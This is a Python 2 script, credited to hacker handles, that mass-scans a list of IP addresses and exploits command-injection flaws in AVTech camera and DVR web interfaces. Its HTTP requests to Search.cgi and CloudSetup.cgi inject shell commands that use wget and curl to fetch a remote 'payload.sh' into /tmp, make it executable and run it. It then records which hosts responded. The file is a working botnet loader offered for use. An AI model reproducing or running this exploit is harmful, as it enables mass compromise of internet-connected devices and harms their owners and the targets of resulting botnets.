#!/usr/bin/python
# AvTechv2 made by #iLLSeCThaGod
# Paradise-inf an avtech remake by D3fe4ted

import sys, time, os, ssl, socket
from threading import Thread
if len(sys.argv) < 3:
	print "Usage: python2 " + sys.argv[0] + " <input> <threads> <output>"
	sys.exit()
ips = map(lambda s: s.strip(), open(sys.argv[1], "r").readlines())
threads = int(sys.argv[2])
thread_count = len(ips) / threads
thread_chunks = [ips[x:x+thread_count] for x in xrange(0, len(ips), thread_count)]
output = sys.argv[3]
found = 0
cons = 0
fails = 0
proc = 0
port = 554
buf = 4096
bins = "payload.sh"
ip = "IPHERE"

headers = "GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://"+ ip +"/"+ bins +"%20-O%2012."+ bins +";curl%20-O%20http://"+ ip +"/"+ bins +"%20-O%2011."+ bins +";%20chmod%20777%20*;%20sh%2011."+ bins +";%20sh%2012."+ bins +")&password=admin HTTP/1.0\r\n\r\n"

headers2 = "GET /cgi-bin/supervisor/CloudSetup.cgi?exefile=cd%20/tmp;%20wget%20http://"+ ip +"/"+ bins +"%20-O%2012."+ bins +";curl%20-O%20http://"+ ip +"/"+ bins +"%20-O%2011."+ bins +";%20chmod%20777%20*;%20sh%2011."+ bins +";%20sh%2012."+ bins +" HTTP/1.0\r\n\r\n"

def checkhost_headers(host):
    global found
    global cons
    global fails
    host = host.strip("\n")
    cons += 1
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.settimeout(5)
            sock.connect((host, port))
        except:
            failed += 1
            sock.close()
        sock.send(headers)
        sock.send(headers2)
        time.sleep(2)
        resp = sock.recv(1024)
        if "200" in resp:
            file = open(output, "a+")
            file.write(host+"\n")
            file.close()
            found += 1
        sock.close()
        cons -= 1
    except:
        cons -= 1
        fails += 1
        pass
def worker(count):
    global cons
    global failed
    global sent
    global proc
    global cons
    count = int(count)
    for i in thread_chunks[count]:
        try:
            proc += 1
            checkhost_headers(i)
        except:
            pass
for x in xrange(threads):
    try:
        t = Thread(target=worker, args=(x,))
        t.start()
    except KeyboardInterrupt:
        sys.exit()
    except:
        pass
while True:
    try: #iLLSeCThaGod
        i = found
        sys.stdout.write("\r\033[33m| Scanned \033[92m[\033[93m" + str(proc) + "\033[92m]\033[33m || \033[33mChecked \033[92m[\033[93m" + str(i) + "\033[92m]\033[33m || Conns \033[92m[\033[93m" + str(cons) + "\033[92m] || Fails \033[92m[\033[93m" + str(fails) + "\033[92m]\033[0m")
        sys.stdout.flush()
        time.sleep(0.25)
    except KeyboardInterrupt:
        sys.exit("| Exiting Scanner")
    except:
        pass